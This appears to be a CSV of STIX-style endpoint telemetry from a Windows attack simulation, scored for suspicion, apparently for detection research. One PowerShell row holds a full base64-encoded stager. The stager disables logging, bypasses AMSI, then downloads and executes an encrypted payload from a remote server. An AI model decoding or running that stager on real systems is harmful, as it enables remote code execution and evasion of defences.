type,name,id,created,binary_ref.type,binary_ref.name,binary_ref.parent_directory_ref.type,binary_ref.parent_directory_ref.path,binary_ref.parent_directory_ref.id,binary_ref.id,pid,opened_connection_refs_count,creator_user_ref.type,creator_user_ref.user_id,creator_user_ref.id,x_contained_by_ref,first_observed,last_observed,number_observed,binary_ref.hashes.MD5,command_line,parent_ref.type,parent_ref.name,parent_ref.binary_ref.type,parent_ref.binary_ref.name,parent_ref.binary_ref.parent_directory_ref.type,parent_ref.binary_ref.parent_directory_ref.path,parent_ref.binary_ref.parent_directory_ref.id,parent_ref.binary_ref.id,parent_ref.pid,parent_ref.command_line,parent_ref.id,command_line_entropy,command_line_len,suspicion_score,opened_connection_refs
file,cmd.exe,file--c1f0cfd0-f6c9-484e-a500-9e7bf68d8428_4,,,,,,,,,,,,,observed-data--c1f0cfd0-f6c9-484e-a500-9e7bf68d8428,2019-05-18T20:43:35.616Z,2019-05-18T20:43:35.616Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--0a9bb248-203c-4a6b-9f68-312f3b6e12bf_1,,,,,,,,,,,,,observed-data--0a9bb248-203c-4a6b-9f68-312f3b6e12bf,2019-05-07T11:57:15.246Z,2019-05-07T11:57:15.246Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--5227656b-f4f9-46f7-be7e-3abe3c3fed03_3,,,,,,,,,,,,,observed-data--5227656b-f4f9-46f7-be7e-3abe3c3fed03,2019-05-07T11:57:14.354Z,2019-05-07T11:57:14.354Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,svchost.exe,process--94b4f138-6ea5-4b55-a47c-20b45d558d7c_0,,file,svchost.exe,directory,C:\Windows\System32,directory--94b4f138-6ea5-4b55-a47c-20b45d558d7c_2,file--94b4f138-6ea5-4b55-a47c-20b45d558d7c_1,292.0,1.0,user-account,S-1-5-18,user-account--94b4f138-6ea5-4b55-a47c-20b45d558d7c_6,observed-data--94b4f138-6ea5-4b55-a47c-20b45d558d7c,2019-05-18T20:43:04.658Z,2019-05-18T20:43:04.658Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--c9068328-bffb-4caf-b382-fb6caf89875c,2020-08-12T09:53:20.410Z,,,,,,,,,,,,,2019-05-18T20:43:37.831Z,2019-05-18T20:43:37.831Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--ae9e1069-6c8f-4e05-87f0-0705bda84416,2020-08-12T09:53:20.440Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--8016ed89-a9a9-4710-a10f-e7d21032ce3c_1,,,,,,,,,,,,,observed-data--8016ed89-a9a9-4710-a10f-e7d21032ce3c,2019-05-18T20:43:41.284Z,2019-05-18T20:43:41.284Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--0179f595-4d83-4e92-a2bc-293f0c28dae0_1,,,,,,,,,,,,,observed-data--0179f595-4d83-4e92-a2bc-293f0c28dae0,2019-05-18T20:44:15.362Z,2019-05-18T20:44:15.362Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--e13eeb23-7dbd-4812-9ea5-6895e516fb6c,2020-08-12T09:53:20.458Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--305d45d4-0f78-4464-80e1-b3687eac17f5_6,,,,,,,,,,,,,observed-data--305d45d4-0f78-4464-80e1-b3687eac17f5,2019-05-07T11:56:31.925Z,2019-05-07T11:56:31.925Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--0dea51d-e46c-4e6a-a2b6-b515caee5d47_2,,,,,,,,,,,,,observed-data--a0dea51d-e46c-4e6a-a2b6-b515caee5d47,2019-05-18T20:43:43.273Z,2019-05-18T20:43:43.273Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--49d13782-95f1-4aad-bb78-b9afcffd9c00_2,,,,,,,,,,,,,observed-data--49d13782-95f1-4aad-bb78-b9afcffd9c00,2019-05-18T20:42:59.034Z,2019-05-18T20:42:59.034Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--0a51fc4e-d463-4d09-85c2-6443f3f8f38d_4,,,,,,,,,,,,,observed-data--0a51fc4e-d463-4d09-85c2-6443f3f8f38d,2019-05-18T20:43:34.941Z,2019-05-18T20:43:34.941Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--91a4c548-fa2b-4ca3-b0ba-05e35108cdf9_1,,,,,,,,,,,,,observed-data--91a4c548-fa2b-4ca3-b0ba-05e35108cdf9,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--14c92b22-065f-4583-b60b-26d89b51da22_2,,,,,,,,,,,,,observed-data--14c92b22-065f-4583-b60b-26d89b51da22,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
ipv4-addr,,ipv4-addr--c689db16-fa71-4888-9b1d-e77ec223f9e2_4,,,,,,,,,,,,,observed-data--c689db16-fa71-4888-9b1d-e77ec223f9e2,2019-05-18T20:43:04.355Z,2019-05-18T20:43:04.355Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--4e8baad-4afa-4adb-853e-51ee589c3137_2,,,,,,,,,,,,,observed-data--a4e8baad-4afa-4adb-853e-51ee589c3137,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--76fc5f1-f765-4ad1-bb34-059928b2b210_4,,,,,,,,,,,,,observed-data--e76fc5f1-f765-4ad1-bb34-059928b2b210,2019-05-18T20:44:16.847Z,2019-05-18T20:44:16.847Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--42b34d19-a8b5-446c-abfa-2b156a70e615_6,,,,,,,,,,,,,observed-data--42b34d19-a8b5-446c-abfa-2b156a70e615,2019-05-18T20:43:36.728Z,2019-05-18T20:43:36.728Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--f269b0cb-2ab0-4038-a11f-191451e8818a_4,,,,,,,,,,,,,observed-data--f269b0cb-2ab0-4038-a11f-191451e8818a,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--f98a2b1f-5b54-4ad0-977f-ba06e9cd56a6,2020-08-12T09:53:20.596Z,,,,,,,,,,,,,2019-05-07T11:57:33.245Z,2019-05-07T11:57:33.245Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--c3365155-2ba6-42c4-a19f-c72298860f33_6,,,,,,,,,,,,,observed-data--c3365155-2ba6-42c4-a19f-c72298860f33,2019-05-18T20:43:35.600Z,2019-05-18T20:43:35.600Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--caf4bad5-c678-4e57-807f-d40ef55745c5_3,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--caf4bad5-c678-4e57-807f-d40ef55745c5_5,file--caf4bad5-c678-4e57-807f-d40ef55745c5_4,5452.0,,,,,observed-data--caf4bad5-c678-4e57-807f-d40ef55745c5,2019-05-18T20:43:35.600Z,2019-05-18T20:43:35.600Z,1.0,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA ",,,,,,,,,,,,4.385642459813404,5458,2,
ipv4-addr,,ipv4-addr--72e6ef34-fc65-4367-aa60-f062327dfa70_3,,,,,,,,,,,,,observed-data--72e6ef34-fc65-4367-aa60-f062327dfa70,2019-05-18T20:43:50.031Z,2019-05-18T20:43:50.031Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--48b05eab-bd3a-4bd5-b81e-7f9b752aea03,2020-08-12T09:53:20.604Z,,,,,,,,,,,,,2019-05-18T20:44:25.550Z,2019-05-18T20:44:25.550Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--6625da70-71c1-40f2-92cd-fc5d98ba7c2e,2020-08-12T09:53:20.528Z,,,,,,,,,,,,,2019-05-18T20:43:43.831Z,2019-05-18T20:43:43.831Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--6ffd7134-8755-437f-8da5-a3ee6ca3bc4f_2,,,,,,,,,,,,,observed-data--6ffd7134-8755-437f-8da5-a3ee6ca3bc4f,2019-05-18T20:43:43.273Z,2019-05-18T20:43:43.273Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--6e116c88-45a1-41ac-bec4-35ff6d59fc36,2020-08-12T09:53:20.490Z,,,,,,,,,,,,,2019-05-18T20:43:43.273Z,2019-05-18T20:43:43.273Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,svchost.exe,process--3819dc13-8abd-4c52-955c-d3eb12dde593_0,,file,svchost.exe,directory,C:\Windows\System32,directory--3819dc13-8abd-4c52-955c-d3eb12dde593_2,file--3819dc13-8abd-4c52-955c-d3eb12dde593_1,3476.0,1.0,user-account,S-1-5-18,user-account--3819dc13-8abd-4c52-955c-d3eb12dde593_6,observed-data--3819dc13-8abd-4c52-955c-d3eb12dde593,2019-05-07T11:56:34.169Z,2019-05-07T11:56:34.169Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--8ff3a09e-44a3-4601-a660-822486a91894,2020-08-12T09:53:20.467Z,,,,,,,,,,,,,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
network-traffic,,network-traffic--731a7a4-0d78-433f-9255-0c1138429b69_4,,,,,,,,,,,,,observed-data--d731a7a4-0d78-433f-9255-0c1138429b69,2019-05-07T11:57:43.433Z,2019-05-07T11:57:43.433Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--0e55352-9d03-42d9-83bc-b0db3c703a76_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--0e55352-9d03-42d9-83bc-b0db3c703a76_2,file--0e55352-9d03-42d9-83bc-b0db3c703a76_1,5204.0,,user-account,S-1-5-18,user-account--0e55352-9d03-42d9-83bc-b0db3c703a76_4,observed-data--e0e55352-9d03-42d9-83bc-b0db3c703a76,2019-05-18T20:43:43.815Z,2019-05-18T20:43:43.815Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--5227656b-f4f9-46f7-be7e-3abe3c3fed03_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--5227656b-f4f9-46f7-be7e-3abe3c3fed03_2,file--5227656b-f4f9-46f7-be7e-3abe3c3fed03_1,5452.0,1.0,user-account,S-1-5-18,user-account--5227656b-f4f9-46f7-be7e-3abe3c3fed03_6,observed-data--5227656b-f4f9-46f7-be7e-3abe3c3fed03,2019-05-07T11:57:14.354Z,2019-05-07T11:57:14.354Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--f72c0b51-7472-47ad-b948-b74ec938a63a_1,,,,,,,,,,,,,observed-data--f72c0b51-7472-47ad-b948-b74ec938a63a,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--2cb4124-b0b0-491a-a44d-89f60e384d34_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--2cb4124-b0b0-491a-a44d-89f60e384d34_2,file--2cb4124-b0b0-491a-a44d-89f60e384d34_1,5204.0,,user-account,S-1-5-18,user-account--2cb4124-b0b0-491a-a44d-89f60e384d34_4,observed-data--a2cb4124-b0b0-491a-a44d-89f60e384d34,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--f47ca014-d197-486c-9e13-726f4d9a6ad1_1,,,,,,,,,,,,,observed-data--f47ca014-d197-486c-9e13-726f4d9a6ad1,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--6b55b561-a6a3-4673-a61d-1a91c5985dbb_3,,,,,,,,,,,,,observed-data--6b55b561-a6a3-4673-a61d-1a91c5985dbb,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--4ea659b9-1db8-4a17-973a-5eda5c159ffd,2020-08-12T09:53:20.553Z,,,,,,,,,,,,,2019-05-18T20:43:46.597Z,2019-05-18T20:43:46.597Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--fd5eed8e-b858-4690-99a8-52d887380b2c_4,,,,,,,,,,,,,observed-data--fd5eed8e-b858-4690-99a8-52d887380b2c,2019-05-18T20:43:13.191Z,2019-05-18T20:43:13.191Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--c38cdc4b-a1bc-4a28-bcad-0418e3e60e6d_3,,,,,,,,,,,,,observed-data--c38cdc4b-a1bc-4a28-bcad-0418e3e60e6d,2019-05-18T20:43:35.112Z,2019-05-18T20:43:35.112Z,1.0,,,,,,,,,,,,,,0.0,0,0,
process,powershell.exe,process--371dd898-7443-4873-a872-459b7f8a8637_0,,file,powershell.exe,directory,C:\Windows\System32\WindowsPowerShell\v1.0,directory--371dd898-7443-4873-a872-459b7f8a8637_2,file--371dd898-7443-4873-a872-459b7f8a8637_1,5204.0,,user-account,S-1-5-18,user-account--371dd898-7443-4873-a872-459b7f8a8637_4,observed-data--371dd898-7443-4873-a872-459b7f8a8637,2019-05-18T20:43:45.753Z,2019-05-18T20:43:45.753Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--7ec00da0-1327-4b27-a836-5044a795d6ee_3,,,,,,,,,,,,,observed-data--7ec00da0-1327-4b27-a836-5044a795d6ee,2019-05-18T20:43:43.456Z,2019-05-18T20:43:43.456Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--f72c0b51-7472-47ad-b948-b74ec938a63a_2,,,,,,,,,,,,,observed-data--f72c0b51-7472-47ad-b948-b74ec938a63a,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--8d68ebd6-ba27-4415-aeec-0f1183dac399_4,,,,,,,,,,,,,observed-data--8d68ebd6-ba27-4415-aeec-0f1183dac399,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--f12b85d5-7249-40d2-bd3c-fe367e2628c9_1,,,,,,,,,,,,,observed-data--f12b85d5-7249-40d2-bd3c-fe367e2628c9,2019-05-18T20:43:43.273Z,2019-05-18T20:43:43.273Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,powershell.exe,file--9839eb75-e2b4-4946-8488-5f00c42e8ba8_1,,,,,,,,,,,,,observed-data--9839eb75-e2b4-4946-8488-5f00c42e8ba8,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--f39c3c-a535-4da2-baf5-f1157d463a74_2,,,,,,,,,,,,,observed-data--daf39c3c-a535-4da2-baf5-f1157d463a74,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--7552235a-52d4-4be3-b87d-01a2dd750e10_3,,,,,,,,,,,,,observed-data--7552235a-52d4-4be3-b87d-01a2dd750e10,2019-05-18T20:43:43.831Z,2019-05-18T20:43:43.831Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--0d7d0de8-9ad6-438e-a262-e4e7a8500813_3,,,,,,,,,,,,,observed-data--0d7d0de8-9ad6-438e-a262-e4e7a8500813,2019-05-18T20:43:43.273Z,2019-05-18T20:43:43.273Z,1.0,,,,,,,,,,,,,,0.0,0,0,
user-account,,user-account--4ea659b9-1db8-4a17-973a-5eda5c159ffd_4,,,,,,,,,,,,,observed-data--4ea659b9-1db8-4a17-973a-5eda5c159ffd,2019-05-18T20:43:46.597Z,2019-05-18T20:43:46.597Z,1.0,,,,,,,,,,,,,,0.0,0,0,
windows-registry-key,,windows-registry-key--0eddb67e-5549-403b-8603-c9b6c4310cfc_3,,,,,,,,,,,,,observed-data--0eddb67e-5549-403b-8603-c9b6c4310cfc,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
file,svchost.exe,file--3819dc13-8abd-4c52-955c-d3eb12dde593_1,,,,,,,,,,,,,observed-data--3819dc13-8abd-4c52-955c-d3eb12dde593,2019-05-07T11:56:34.169Z,2019-05-07T11:56:34.169Z,1.0,,,,,,,,,,,,,,0.0,0,0,
directory,,directory--7f0e6ae5-6d12-4a00-95af-71f8c0c4c459_2,,,,,,,,,,,,,observed-data--7f0e6ae5-6d12-4a00-95af-71f8c0c4c459,2019-05-18T20:43:41.175Z,2019-05-18T20:43:41.175Z,1.0,,,,,,,,,,,,,,0.0,0,0,
observed-data,,observed-data--283e72fd-51f3-4b44-aea2-6a3ded903c64,2020-08-12T09:53:20.608Z,,,,,,,,,,,,,2019-05-07T11:57:44.916Z,2019-05-07T11:57:44.916Z,1.0,,,,,,,,,,,,,,0.0,0,0,
